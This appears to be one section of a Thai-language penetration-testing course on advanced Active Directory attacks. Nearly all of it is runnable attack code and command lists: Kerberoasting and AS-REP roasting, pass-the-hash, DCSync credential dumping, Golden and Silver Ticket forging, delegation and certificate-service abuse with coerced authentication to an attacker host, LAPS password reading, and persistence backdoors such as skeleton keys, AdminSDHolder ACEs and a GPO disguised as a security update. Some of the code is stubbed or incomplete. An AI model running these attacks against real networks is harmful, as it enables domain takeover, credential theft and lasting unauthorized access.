# Part 54: Active Directory Advanced Attacks (Steps 531-540)

## ภาพรวม
ส่วนนี้ครอบคลุมการโจมตี Active Directory ขั้นสูง ตั้งแต่ Kerberoasting, DCSync, Golden/Silver Ticket ไปจนถึง Domain Persistence

---

## Step 531: Kerberoasting

### ทฤษฎี Kerberoasting
```
Kerberoasting:
1. Request TGS ticket สำหรับ Service Account (SPN)
2. TGS ถูกเชียด้วย password hash ของ service account
3. Crack offline -> ได้ plaintext password!

ใช้ได้เพียง domain user account (ไม่ต้อง admin)
```

### Kerberoasting Framework
```python
#!/usr/bin/env python3
# kerberoasting.py

from impacket.krb5.asn1 import TGS_REP
from impacket.krb5 import constants
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
from impacket.krb5.ccache import CCache
import hashlib
import binascii
from datetime import datetime

class KerberoastingAttacker:
    """Kerberoasting Attack Framework"""
    
    def __init__(self, domain: str, dc_ip: str,
                 username: str, password: str):
        self.domain = domain
        self.dc_ip = dc_ip
        self.username = username
        self.password = password
    
    def get_tgt(self) -> tuple:
        """Get Ticket Granting Ticket"""
        from impacket.krb5.kerberosv5 import getKerberosTGT
        
        client_name = Principal(
            self.username,
            type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )
        
        tgt, cipher, old_session_key, session_key = getKerberosTGT(
            client_name,
            self.password,
            self.domain,
            None, None, None,
            self.dc_ip
        )
        return tgt, cipher, old_session_key, session_key
    
    def request_tgs_for_spn(self, spn: str) -> bytes:
        """Request TGS สำหรับ SPN ที่ต้องการ"""
        tgt, cipher, old_key, session_key = self.get_tgt()
        
        server_name = Principal(
            spn,
            type=constants.PrincipalNameType.NT_SRV_INST.value
        )
        
        tgs, cipher, old_key2, session_key2 = getKerberosTGS(
            server_name,
            self.domain,
            self.dc_ip,
            tgt, cipher,
            session_key
        )
        return tgs
    
    def extract_hash_from_tgs(self, tgs: bytes) -> str:
        """Extract hash จาก TGS สำหรับ Hashcat"""
        # Format: $krb5tgs$23$*user*domain*spn*$hash
        decoded_tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
        enc_part = decoded_tgs['enc-part']
        
        etype = int(enc_part['etype'])
        cipher_text = bytes(enc_part['cipher'])
        
        # RC4-HMAC (etype 23) -> hashcat mode 13100
        if etype == 23:
            hash_str = f"$krb5tgs$23$*{self.username}${self.domain}$spn*"
            hash_str += binascii.hexlify(cipher_text[:16]).decode()
            hash_str += '$' + binascii.hexlify(cipher_text[16:]).decode()
            return hash_str
        
        return None


# impacket GetUserSPNs.py Usage
KERBEROAST_COMMANDS = """
# Impacket GetUserSPNs.py
python3 GetUserSPNs.py DOMAIN/username:password -dc-ip DC_IP -request

# บันทึก hashes
python3 GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request -outputfile hashes.kerberoast

# Crack ด้วย hashcat
hashcat -a 0 -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# Rubeus (Windows)
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt

# PowerView
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv hash.csv

# ป้องกัน Kerberoasting:
# - ใช้ AES256 encryption แทน RC4
# - password policy แข็งสำหรับ service accounts
# - Managed Service Accounts (MSA/gMSA)
"""
```

---

## Step 532: AS-REP Roasting

### AS-REP Roasting Framework
```python
#!/usr/bin/env python3
# asrep_roasting.py

from impacket.krb5 import constants
from impacket.krb5.kerberosv5 import sendReceive
from impacket.krb5.asn1 import AS_REQ, AS_REP, KERB_PA_PAC_REQUEST
from impacket.krb5.types import Principal, KerberosTime, Ticket

class ASREPRoaster:
    """AS-REP Roasting - วิธีใช้กับ users ที่ pre-auth disabled"""
    
    def __init__(self, domain: str, dc_ip: str):
        self.domain = domain
        self.dc_ip = dc_ip
    
    def request_as_rep(self, username: str) -> bytes:
        """Request AS-REP โดยไม่ต้อง pre-auth"""
        # Build AS-REQ โดยไม่มี PA-DATA
        client_name = Principal(
            username,
            type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )
        
        # AS-REP จะประกอบด้วย encrypted data
        # ที่เขียนด้วย password ของ user
        # -> crack offline!
        pass
    
    def get_asrep_hashes(self, userlist: list) -> list:
        """Request AS-REP hashes สำหรับ users ที่ pre-auth disabled"""
        hashes = []
        
        for username in userlist:
            try:
                asrep = self.request_as_rep(username)
                if asrep:
                    hash_str = self._format_hash(username, asrep)
                    hashes.append(hash_str)
                    print(f"[+] Got AS-REP hash for: {username}")
            except Exception as e:
                pass  # pre-auth required = skip
        
        return hashes
    
    def _format_hash(self, username: str, asrep: bytes) -> str:
        """Format hash สำหรับ hashcat mode 18200"""
        # $krb5asrep$23$user@DOMAIN:hash
        return f"$krb5asrep$23${username}@{self.domain}:..."


ASREP_COMMANDS = """
# impacket GetNPUsers.py
python3 GetNPUsers.py DOMAIN/ -dc-ip DC_IP -usersfile users.txt -format hashcat -outputfile asrep.txt

# โดยไม่ต้อง credentials:
python3 GetNPUsers.py DOMAIN/ -dc-ip DC_IP -usersfile users.txt -request -no-pass

# Crack
hashcat -a 0 -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Rubeus (Windows)
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
Rubeus.exe asreproast /user:username /format:hashcat

# หา users ที่ pre-auth disabled
Get-DomainUser -PreauthNotRequired
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
"""
```

---

## Step 533: Pass-the-Hash และ Pass-the-Ticket

### Pass-the-Hash/Ticket Framework
```python
#!/usr/bin/env python3
# pass_the_hash_ticket.py

from impacket.smbconnection import SMBConnection
from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5.ccache import CCache
import subprocess

class PassTheHashAttacker:
    """Pass-the-Hash และ Pass-the-Ticket Attacks"""
    
    def __init__(self, dc_ip: str, domain: str):
        self.dc_ip = dc_ip
        self.domain = domain
    
    def pth_smb(self, username: str, nt_hash: str, 
                target_ip: str) -> bool:
        """Pass-the-Hash ผ่าน SMB"""
        conn = SMBConnection(target_ip, target_ip)
        
        # ระบุ LM hash = aad3b435b51404eeaad3b435b51404ee (empty)
        conn.login(
            username,
            '',
            self.domain,
            lmhash='aad3b435b51404eeaad3b435b51404ee',
            nthash=nt_hash
        )
        
        print(f"[+] PTH success: {username}@{target_ip}")
        return True
    
    def pth_wmiexec(self, username: str, nt_hash: str,
                    target_ip: str, command: str) -> str:
        """Pass-the-Hash ผ่าน WMI Exec"""
        cmd = [
            'python3', 'wmiexec.py',
            f"{self.domain}/{username}@{target_ip}",
            '-hashes', f':{nt_hash}',
            '-nooutput'
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout
    
    def ptt_inject_ticket(self, ticket_path: str) -> bool:
        """Pass-the-Ticket - inject ticket เข้าไปใน cache"""
        # Linux: ใช้ ccache
        import os
        os.environ['KRB5CCNAME'] = ticket_path
        print(f"[+] Ticket injected: {ticket_path}")
        return True
    
    def overpass_the_hash(self, username: str, nt_hash: str) -> bytes:
        """Overpass-the-Hash: แปลง NTLM hash -> Kerberos TGT"""
        from impacket.krb5.kerberosv5 import getKerberosTGT
        from impacket.krb5.types import Principal
        from impacket.krb5 import constants
        
        client_name = Principal(
            username,
            type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )
        
        # ใช้ NT hash เป็น RC4 key
        tgt, cipher, old_key, session_key = getKerberosTGT(
            client_name,
            '',
            self.domain,
            None,
            bytes.fromhex(nt_hash),  # NT hash
            None,
            self.dc_ip
        )
        return tgt


PTH_COMMANDS = """
# Pass-the-Hash Commands

# impacket suite
python3 psexec.py DOMAIN/user@TARGET -hashes :NTHASH
python3 wmiexec.py DOMAIN/user@TARGET -hashes :NTHASH 'whoami'
python3 smbexec.py DOMAIN/user@TARGET -hashes :NTHASH
python3 atexec.py DOMAIN/user@TARGET 'whoami' -hashes :NTHASH

# CrackMapExec
crackmapexec smb TARGET -u user -H NTHASH --exec-method wmiexec -x 'whoami'
crackmapexec smb SUBNET/24 -u user -H NTHASH  # spray

# Evil-WinRM (WinRM)
evil-winrm -i TARGET -u user -H NTHASH

# Pass-the-Ticket
# Export ticket .ccache จาก Mimikatz:
# sekurlsa::tickets /export

# ใช้ ticket บน Linux
export KRB5CCNAME=/path/to/ticket.ccache
python3 psexec.py -no-pass -k DOMAIN/user@TARGET
"""
```

---

## Step 534: DCSync Attack

### DCSync - Dump Domain Credentials
```python
#!/usr/bin/env python3
# dcsync_attack.py

from impacket.dcerpc.v5 import nrpc, epm, transport
from impacket.dcerpc.v5.dtypes import NULL

class DCSyncAttacker:
    """DCSync - Dump NTDS.dit credentials via replication"""
    
    def __init__(self, domain: str, dc_ip: str,
                 username: str, password: str = None,
                 nt_hash: str = None):
        self.domain = domain
        self.dc_ip = dc_ip
        self.username = username
        self.password = password
        self.nt_hash = nt_hash
    
    def dcsync_user(self, target_user: str = 'krbtgt') -> dict:
        """DCSync เพื่อดึง hash ของ user ที่ต้องการ"""
        # ต้องการสิทธิ์ DS-Replication-Get-Changes
        # และ DS-Replication-Get-Changes-All
        pass
    
    def dump_all_hashes(self) -> list:
        """Dump hashes ทั้งหมด (impacket secretsdump)"""
        pass


DCSYNC_COMMANDS = """
# impacket secretsdump.py
python3 secretsdump.py DOMAIN/user:password@DC_IP

# PTH mode
python3 secretsdump.py DOMAIN/user@DC_IP -hashes :NTHASH

# Dump specific user
python3 secretsdump.py DOMAIN/user:password@DC_IP -just-dc-user administrator

# Dump ทั้งหมด
python3 secretsdump.py DOMAIN/user:password@DC_IP -just-dc

# Mimikatz (Windows)
lsadump::dcsync /domain:DOMAIN /user:krbtgt
lsadump::dcsync /domain:DOMAIN /all /csv

# ต้องการสิทธิ์:
# - Domain Admin
# - Account Operators  
# - Backup Operators
# - Replicating Directory Changes + Replicating Directory Changes All
"""
```

---

## Step 535: Golden Ticket และ Silver Ticket

### Golden/Silver Ticket Framework
```python
#!/usr/bin/env python3
# golden_silver_ticket.py

from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5.ccache import CCache
from impacket.krb5 import constants
from impacket.krb5.types import Principal, KerberosTime
from datetime import datetime, timedelta
import binascii

class TicketForger:
    """Golden และ Silver Ticket Forging"""
    
    def forge_golden_ticket(self, 
                             username: str,
                             domain: str,
                             domain_sid: str,
                             krbtgt_hash: str,
                             user_id: int = 500,
                             groups: list = None) -> str:
        """Golden Ticket: เสนหา TGT ด้วย krbtgt hash
        
        ต้องการ:
        - krbtgt NT hash (DCSync)
        - Domain SID
        - ใช้ได้ 10+ ปี (Golden Ticket duration)
        """
        if groups is None:
            groups = [512, 513, 514, 515, 516, 518, 519, 520]
            # 512 = Domain Admins, 519 = Enterprise Admins
        
        # ticketer.py จาก impacket
        cmd = f"ticketer.py -nthash {krbtgt_hash} -domain-sid {domain_sid} -domain {domain} {username}"
        return cmd
    
    def forge_silver_ticket(self,
                             username: str,
                             domain: str,
                             domain_sid: str,
                             service_hash: str,
                             service_spn: str) -> str:
        """Silver Ticket: เสนหา TGS ด้วย service account hash
        
        ต้องการ:
        - Service account NT hash
        - Domain SID
        - Service SPN (เช่น CIFS/server.domain.com)
        """
        cmd = (
            f"ticketer.py -nthash {service_hash} "
            f"-domain-sid {domain_sid} "
            f"-domain {domain} "
            f"-spn {service_spn} "
            f"{username}"
        )
        return cmd


GOLDEN_SILVER_COMMANDS = """
# Golden Ticket ด้วย impacket ticketer.py

# 1. ดึง Domain SID
python3 getPac.py DOMAIN/user:password@DC_IP
# หรือ
whoami /user  # Windows

# 2. ดึง krbtgt hash (DCSync)
python3 secretsdump.py DOMAIN/admin@DC_IP -just-dc-user krbtgt

# 3. Forge Golden Ticket
python3 ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain DOMAIN administrator

# 4. ใช้ ticket
export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass DOMAIN/administrator@DC_IP

# Silver Ticket
python3 ticketer.py -nthash SERVICE_HASH -domain-sid SID -domain DOMAIN -spn CIFS/server.domain.com username

# Mimikatz
# Golden Ticket
kerberos::golden /user:Administrator /domain:DOMAIN /sid:S-1-5-21-xxx /krbtgt:HASH /id:500

# Silver Ticket  
kerberos::golden /user:Administrator /domain:DOMAIN /sid:SID /target:server /service:cifs /rc4:HASH

# ใช้ ticket ใน session
kerberos::ptt ticket.kirbi

# ป้องกัน:
# - Reset krbtgt password สองครั้ง (replication)
# - Monitor TGT ที่มีอายุสั้นยาวผิดปกติ
"""
```

---

## Step 536: Constrained และ Unconstrained Delegation

### Delegation Attacks
```python
#!/usr/bin/env python3
# delegation_attacks.py

from impacket.ldap import ldaptypes
import ldap3

class DelegationAttacker:
    """Kerberos Delegation Attack Framework"""
    
    def __init__(self, domain: str, dc_ip: str,
                 username: str, password: str):
        self.domain = domain
        self.dc_ip = dc_ip
        self.username = username
        self.password = password
    
    def find_unconstrained_delegation(self) -> list:
        """ค้นหา computers/services ที่มี Unconstrained Delegation"""
        # ADS_UF_TRUSTED_FOR_DELEGATION = 0x80000
        conn = ldap3.Connection(
            ldap3.Server(self.dc_ip),
            user=f"{self.domain}\\{self.username}",
            password=self.password,
            authentication=ldap3.NTLM
        )
        conn.bind()
        
        base_dn = ','.join([f'DC={part}' for part in self.domain.split('.')])
        
        # ค้นหา objects ที่ TrustedForDelegation = True
        conn.search(
            base_dn,
            '(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))',
            attributes=['sAMAccountName', 'distinguishedName', 'userAccountControl']
        )
        
        unconstrained = []
        for entry in conn.entries:
            unconstrained.append({
                'name': str(entry['sAMAccountName']),
                'dn': str(entry['distinguishedName'])
            })
            print(f"[!] Unconstrained Delegation: {entry['sAMAccountName']}")
        
        return unconstrained
    
    def find_constrained_delegation(self) -> list:
        """ค้นหา Constrained Delegation"""
        conn = ldap3.Connection(
            ldap3.Server(self.dc_ip),
            user=f"{self.domain}\\{self.username}",
            password=self.password,
            authentication=ldap3.NTLM
        )
        conn.bind()
        
        base_dn = ','.join([f'DC={part}' for part in self.domain.split('.')])
        
        conn.search(
            base_dn,
            '(msDS-AllowedToDelegateTo=*)',
            attributes=['sAMAccountName', 'msDS-AllowedToDelegateTo']
        )
        
        constrained = []
        for entry in conn.entries:
            allowed_to = entry['msDS-AllowedToDelegateTo'].values
            constrained.append({
                'name': str(entry['sAMAccountName']),
                'allowed_to_delegate': allowed_to
            })
            print(f"[!] Constrained Delegation: {entry['sAMAccountName']} -> {allowed_to}")
        
        return constrained
    
    def resource_based_constrained_delegation(self,
                                               target_computer: str,
                                               controlled_computer: str) -> str:
        """Resource-Based Constrained Delegation (RBCD) Attack
        
        Prerequisites:
        1. GenericWrite บน target computer
        2. มี computer account ที่ควบคุมได้
        """
        # 1. ตั้ง msDS-AllowedToActOnBehalfOfOtherIdentity
        # สำหรับ controlled computer
        conn = ldap3.Connection(
            ldap3.Server(self.dc_ip),
            user=f"{self.domain}\\{self.username}",
            password=self.password,
            authentication=ldap3.NTLM
        )
        conn.bind()
        
        # 2. S4U2Self + S4U2Proxy เพื่อ get TGS สำหรับ target
        return f"""
# RBCD Attack Steps:
# 1. Add computer account (MachineAccountQuota > 0)
python3 addcomputer.py -computer-name 'attacker$' -computer-pass 'P@ssw0rd' DOMAIN/user:pass@DC_IP

# 2. Set RBCD on target
python3 rbcd.py -delegate-from 'attacker$' -delegate-to '{target_computer}' -action write DOMAIN/user:pass@DC_IP

# 3. S4U2Proxy to get TGS
python3 getST.py -spn CIFS/{target_computer} -impersonate administrator -dc-ip DC_IP DOMAIN/'attacker$':P@ssw0rd

# 4. Use TGS
export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass DOMAIN/administrator@{target_computer}
"""


DELEGATION_COMMANDS = """
# Unconstrained Delegation Attack
# 1. เข้าถึง server ที่มี unconstrained delegation
# 2. Monitor หา TGT tickets
python3 secretsdump.py DOMAIN/admin@UNCONSTRAINED_SERVER -hashes :HASH

# SpoolFool: บังคับ DC ให้ส่ง TGT มา
git clone https://github.com/dirkjanm/krbrelayx
python3 krbrelayx.py --kerberos-port 88
python3 printerbug.py DOMAIN/user:pass@DC_IP UNCONSTRAINED_HOST

# Constrained Delegation - S4U2Proxy
python3 getST.py -spn CIFS/server -impersonate administrator DOMAIN/svc_account:pass@DC_IP
export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass -dc-ip DC_IP DOMAIN/administrator@server
"""
```

---

## Step 537: AD Certificate Services (ADCS) Attacks

### ESC1-8 Certificate Misconfigurations
```python
#!/usr/bin/env python3
# adcs_attacks.py

import subprocess

class ADCSAttacker:
    """Active Directory Certificate Services Attacks"""
    
    def __init__(self, domain: str, dc_ip: str,
                 ca_server: str, username: str, password: str):
        self.domain = domain
        self.dc_ip = dc_ip
        self.ca_server = ca_server
        self.username = username
        self.password = password
    
    def find_vulnerable_templates(self) -> list:
        """Find certificate templates ที่เสี่ยง (certipy)"""
        cmd = [
            'certipy', 'find',
            '-username', f'{self.username}@{self.domain}',
            '-password', self.password,
            '-dc-ip', self.dc_ip,
            '-vulnerable', '-enabled'
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout
    
    def esc1_request_cert(self, template: str,
                          upn: str = 'administrator@domain.com') -> str:
        """ESC1: ร้องได้เป็น template เพื่อ request cert เป็น admin"""
        # Template เปิดให้ requester กำหนด SAN (Subject Alternative Name)
        cmd = [
            'certipy', 'req',
            '-username', f'{self.username}@{self.domain}',
            '-password', self.password,
            '-ca', self.ca_server,
            '-template', template,
            '-upn', upn,  # Impersonate admin!
            '-dc-ip', self.dc_ip
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout
    
    def esc4_template_misconfiguration(self, template: str) -> str:
        """ESC4: Modify vulnerable template -> ESC1"""
        cmd = [
            'certipy', 'template',
            '-username', f'{self.username}@{self.domain}',
            '-password', self.password,
            '-template', template,
            '-save-old',
            '-dc-ip', self.dc_ip
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout
    
    def esc8_ntlm_relay_to_ca(self, ca_http: str,
                               target: str) -> None:
        """ESC8: NTLM Relay to ADCS HTTP Endpoint"""
        # ใช้ ntlmrelayx รับแล้ว relay ไป CA HTTP
        relay_cmd = [
            'python3', 'ntlmrelayx.py',
            '-t', f'http://{ca_http}/certsrv/certfnsh.asp',
            '--adcs', '--template', 'DomainController'
        ]
        print(f"[*] Start relay: {' '.join(relay_cmd)}")
        
        # Trigger auth
        trigger_cmd = [
            'python3', 'printerbug.py',
            f'{self.domain}/{self.username}:{self.password}@{target}',
            'attacker_host'
        ]
        print(f"[*] Trigger auth: {' '.join(trigger_cmd)}")
    
    def pass_the_cert(self, cert_file: str, target: str) -> None:
        """Pass-the-Certificate: ใช้ certificate เพื่อ authenticate"""
        # Certipy auth
        cmd = [
            'certipy', 'auth',
            '-pfx', cert_file,
            '-dc-ip', self.dc_ip
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        # ได้ NT hash หรือ TGT!


ADCS_COMMANDS = """
# Install certipy
pip3 install certipy-ad

# Enumerate ADCS
certipy find -username user@DOMAIN -password pass -dc-ip DC_IP
certipy find -username user@DOMAIN -password pass -dc-ip DC_IP -vulnerable

# ESC1: Request cert as admin
certipy req -username user@DOMAIN -password pass -ca CA_NAME -template TEMPLATE -upn administrator@DOMAIN

# Convert PFX -> get NT hash
certipy auth -pfx administrator.pfx -dc-ip DC_IP
# Output: NT Hash + TGT!

# ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 เปิดอยู่บน CA
certipy req -username user@DOMAIN -password pass -ca CA_NAME -template User -upn administrator@DOMAIN

# Coerce auth สำหรับ ESC8
# Install: coercer
python3 Coercer.py coerce -t DC_IP -l attacker_IP -u user -p pass -d DOMAIN
"""
```

---

## Step 538: BloodHound และ AD Attack Paths

### BloodHound Analysis Framework
```python
#!/usr/bin/env python3
# bloodhound_analysis.py

from neo4j import GraphDatabase
import json

class BloodHoundAnalyzer:
    """BloodHound AD Attack Path Analysis"""
    
    def __init__(self, neo4j_uri: str = 'bolt://localhost:7687',
                 username: str = 'neo4j', password: str = 'bloodhound'):
        self.driver = GraphDatabase.driver(neo4j_uri, auth=(username, password))
    
    def find_shortest_path_to_da(self, start_user: str) -> list:
        """Find shortest path to Domain Admin"""
        query = """
        MATCH p=shortestPath(
            (n:User {name: $start_user})-[*1..]->(m:Group {name: 'DOMAIN ADMINS@DOMAIN.COM'})
        )
        RETURN p
        """
        
        with self.driver.session() as session:
            result = session.run(query, start_user=start_user.upper())
            paths = []
            for record in result:
                paths.append(record['p'])
            return paths
    
    def find_kerberoastable_da_path(self) -> list:
        """Find Kerberoastable users with path to Domain Admin"""
        query = """
        MATCH (u:User {hasspn:true})
        MATCH p=shortestPath((u)-[*1..]->(g:Group {name: 'DOMAIN ADMINS@DOMAIN.COM'}))
        RETURN u.name, u.pwdlastset, length(p) as pathLength
        ORDER BY pathLength
        LIMIT 10
        """
        
        with self.driver.session() as session:
            result = session.run(query)
            return [dict(record) for record in result]
    
    def find_owned_path_to_da(self, owned_users: list) -> list:
        """Mark owned users และหา path to DA"""
        # Mark users as owned
        mark_query = """
        MATCH (u:User)
        WHERE u.name IN $users
        SET u.owned = true
        """
        
        # Find attack paths
        path_query = """
        MATCH (u:User {owned: true})
        MATCH p=shortestPath((u)-[*1..]->(g:Group {name: 'DOMAIN ADMINS@DOMAIN.COM'}))
        RETURN u.name as StartNode, 
               [n in nodes(p) | n.name] as PathNodes,
               length(p) as Hops
        ORDER BY Hops
        """
        
        with self.driver.session() as session:
            session.run(mark_query, users=[u.upper() for u in owned_users])
            result = session.run(path_query)
            return [dict(record) for record in result]
    
    def find_acl_abuse_paths(self) -> list:
        """Find ACL abuse paths (GenericAll, GenericWrite, WriteDACL, etc.)"""
        query = """
        MATCH p=(u:User)-[r:GenericAll|GenericWrite|WriteOwner|WriteDACL|ForceChangePassword]->(target)
        WHERE NOT u.name CONTAINS 'ADMIN' AND NOT u.name CONTAINS 'DOMAIN'
        RETURN u.name as User, TYPE(r) as Relationship, target.name as Target
        LIMIT 50
        """
        
        with self.driver.session() as session:
            result = session.run(query)
            paths = [dict(record) for record in result]
            
            print("\n[*] ACL Abuse Opportunities:")
            for path in paths:
                print(f"  {path['User']} --[{path['Relationship']}]--> {path['Target']}")
            
            return paths
    
    def close(self):
        self.driver.close()


BLOODHOUND_COMMANDS = """
# BloodHound Setup
# 1. ติดตั้ง BloodHound CE
docker run -p 7474:7474 -p 7687:7687 specterops/bloodhound-ce

# 2. Collection ด้วย SharpHound
# Windows:
SharpHound.exe -c All --outputdirectory C:\\Temp
SharpHound.exe -c All,GPOLocalGroup --zippassword infected

# Linux:
python3 bloodhound-python -u user -p pass -d DOMAIN -ns DC_IP -c All

# 3. Upload data เข้า BloodHound
# Upload ZIP file ผ่าน UI

# BloodHound Cypher Queries:
# หา Domain Admin paths
MATCH (n:User),(m:Group {name:'DOMAIN ADMINS@DOMAIN.COM'}),p=shortestPath((n)-[*1..]->(m)) RETURN p

# หา Kerberoastable users  
MATCH (n:User {hasspn:true}) RETURN n

# หา computers ที่ domain admins logged in
MATCH (n:User)-[:HasSession]->(c:Computer) WHERE n.memberof CONTAINS 'Domain Admins' RETURN n,c
"""
```

---

## Step 539: LAPS และ Local Admin Password Bypass

### LAPS Exploitation
```python
#!/usr/bin/env python3
# laps_bypass.py

import ldap3
import subprocess

class LAPSBypass:
    """Local Administrator Password Solution (LAPS) Bypass"""
    
    def __init__(self, domain: str, dc_ip: str,
                 username: str, password: str):
        self.domain = domain
        self.dc_ip = dc_ip
        self.conn = ldap3.Connection(
            ldap3.Server(dc_ip),
            user=f"{domain}\\{username}",
            password=password,
            authentication=ldap3.NTLM
        )
        self.conn.bind()
    
    def read_laps_password(self, computer_name: str = None) -> list:
        """อ่าน LAPS passwords จาก AD"""
        base_dn = ','.join([f'DC={part}' for part in self.domain.split('.')])
        
        # ms-Mcs-AdmPwd = LAPS password field
        self.conn.search(
            base_dn,
            f'(ms-Mcs-AdmPwd=*)' if not computer_name else f'(cn={computer_name})',
            attributes=['cn', 'ms-Mcs-AdmPwd', 'ms-Mcs-AdmPwdExpirationTime']
        )
        
        results = []
        for entry in self.conn.entries:
            if entry['ms-Mcs-AdmPwd'].value:
                results.append({
                    'computer': str(entry['cn']),
                    'password': str(entry['ms-Mcs-AdmPwd']),
                    'expiry': str(entry['ms-Mcs-AdmPwdExpirationTime'])
                })
                print(f"[+] LAPS: {entry['cn']} -> {entry['ms-Mcs-AdmPwd']}")
        
        return results
    
    def find_laps_readable_users(self) -> list:
        """หา users ที่อ่าน LAPS password ได้"""
        # ดู ACL บน ms-Mcs-AdmPwd attribute
        pass


LAPS_COMMANDS = """
# อ่าน LAPS passwords

# CrackMapExec
crackmapexec ldap DC_IP -u user -p pass --module laps
crackmapexec ldap DC_IP -u user -p pass -M laps

# LAPSToolkit (PowerShell)
Get-LAPSComputers
Get-LAPSPasswords  # ต้องการสิทธิ์

# impacket
python3 GetLAPSPassword.py DOMAIN/user:pass@DC_IP -computer COMPUTER_NAME

# ldapsearch
ldapsearch -x -H ldap://DC_IP -D 'user@domain.com' -w 'password' \
  -b 'DC=domain,DC=com' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd cn

# PowerShell direct
Get-ADComputer COMPUTER -Properties ms-Mcs-AdmPwd | Select Name,ms-Mcs-AdmPwd
"""
```

---

## Step 540: Domain Persistence Techniques

### AD Persistence Framework
```python
#!/usr/bin/env python3
# ad_persistence.py

import subprocess
from datetime import datetime, timedelta

class ADPersistence:
    """Active Directory Persistence Techniques"""
    
    PERSISTENCE_TECHNIQUES = {
        'golden_ticket': '''
# Golden Ticket (requires krbtgt hash)
# Lasts 10 years by default
lsadump::dcsync /domain:DOMAIN /user:krbtgt
kerberos::golden /user:backdoor /domain:DOMAIN /sid:SID /krbtgt:HASH /endin:99999
''',
        'skeleton_key': '''
# Skeleton Key (requires DA)
# ทุก account ใช้ password "mimikatz" ได้
misc::skeleton
''',
        'dsrm_backdoor': '''
# Directory Services Restore Mode (DSRM) backdoor
# Enable DSRM account login over network
New-ItemProperty "HKLM:\\System\\CurrentControlSet\\Control\\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
''',
        'acl_backdoor': '''
# DCSync rights สำหรับ backdoor user
# PowerView
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" \
    -PrincipalIdentity backdoor_user \
    -Rights DCSync
''',
        'adminsdholder': '''
# AdminSDHolder backdoor
# เพิ่ม ACE ให้ backdoor user ใน AdminSDHolder
# SDProp จะแพร่ permissions ไปยัง protected groups
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=com" \
    -PrincipalIdentity backdoor_user \
    -Rights All
''',
        'gpo_persistence': '''
# GPO-based persistence
# สร้าง GPO ที่รัน payload ทุกครั้ง logon
New-GPO -Name "Update Policy" -Comment "Security Update"
New-GPLink -Name "Update Policy" -Target "DC=domain,DC=com"
''',
        'sid_history': '''
# SID History injection เพื่อ privilege escalation
# Mimikatz:
sidHistory::add /sam:backdoor_user /new:S-1-5-21-DOMAINSID-519  # Enterprise Admins SID
''',
        'msol_user': '''
# Abuse MSOL_* account (Azure AD Connect)
# MSOL_* มีสิทธิ์ DCSync!
# ค้นหา: Get-ADUser -Filter {SamAccountName -like "MSOL_*"}
'''
    }
    
    def print_persistence_guide(self):
        """แสดงคู่มือ persistence techniques"""
        print("=== AD Persistence Techniques ===")
        for technique, commands in self.PERSISTENCE_TECHNIQUES.items():
            print(f"\n--- {technique} ---")
            print(commands)
    
    def detect_persistence(self) -> dict:
        """ตรวจหา persistence indicators"""
        indicators = {
            'adminsdholder_ace': 'Check AdminSDHolder ACEs',
            'dc_replication_rights': 'Users with DCSync rights',
            'skeleton_key': 'Check for unusual LSASS modules',
            'golden_ticket': 'Monitor Kerberos tickets > 10 hours',
            'dsrm': 'Check DsrmAdminLogonBehavior registry',
        }
        return indicators


if __name__ == '__main__':
    persistence = ADPersistence()
    persistence.print_persistence_guide()
    
    print("\n=== Detection Indicators ===")
    indicators = persistence.detect_persistence()
    for k, v in indicators.items():
        print(f"  [{k}]: {v}")
```

---

## สรุป Part 54

ในส่วนนี้เราได้เรียนรู้:
- **Step 531**: Kerberoasting - Request/Crack TGS tickets
- **Step 532**: AS-REP Roasting - Users ที่ไม่มี pre-auth
- **Step 533**: Pass-the-Hash และ Pass-the-Ticket
- **Step 534**: DCSync Attack - Dump NTDS.dit
- **Step 535**: Golden และ Silver Ticket Forging
- **Step 536**: Kerberos Delegation Attacks (Unconstrained, Constrained, RBCD)
- **Step 537**: ADCS Attacks (ESC1-8 certificate misconfigurations)
- **Step 538**: BloodHound Attack Path Analysis
- **Step 539**: LAPS Password Extraction
- **Step 540**: Domain Persistence Techniques

ทุกเทคนิคต้องใช้ใน **authorized testing environment** เท่านั้น
